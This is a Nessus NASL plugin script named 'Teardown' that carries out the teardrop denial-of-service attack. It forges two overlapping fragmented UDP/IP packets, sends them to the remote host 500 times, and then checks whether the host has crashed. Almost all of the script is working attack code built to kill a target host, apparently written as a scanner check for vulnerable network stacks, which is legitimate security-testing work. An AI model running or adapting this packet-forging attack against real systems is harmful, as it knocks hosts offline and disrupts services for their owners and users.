
if(description)	{
	script_name(english:"Teardown");
	script_summary(english:"Crashes the remote host using the 'teardrop' attack");
	script_category(ACT_KILL_HOST);
	script_copyright(english:"This script was written by Riccardo Melioli");
	exit(0);
}

# Constants
IPH = 20;
UDPH = 8;
PADDING = 28;
OFFSET = 2;
sport = 123;
dport = 21;

UDPLEN = UDPH + PADDING;
IPLEN = IPH + UDPLEN;
IPLEN2 = IPH + OFFSET + 1;
src = get_host_ip();

# Create IP packet
ip = forge_ip_packet(
		     ip_len : IPLEN,
		     ip_off : IP_MF,
		     ip_p : IPPROTO_UDP,
		     ip_src : src
);

# Create UDP packet 1
udp1 = forge_udp_packet(ip: ip,
		    uh_sport : sport,
		    uh_dport : dport,
		    uh_ulen : UDPLEN);

# Modify IP packet
ip = set_ip_elements(ip: ip,
		    ip_len : IPLEN2,
		    ip_off : OFFSET);

# Create UDP packet 2
udp2 = forge_udp_packet(ip: ip,
		    uh_sport : sport,
		    uh_dport : dport,
		    uh_ulen : UDPLEN);

# Send UDP packets 500 times
start_denial();
send_packet(udp1,udp2, pcap_active:FALSE) x 500;
sleep(10);
alive = end_denial();

if(!alive){
			set_kb_item(name:"Host/dead", value:TRUE);
			security_hole(0);
}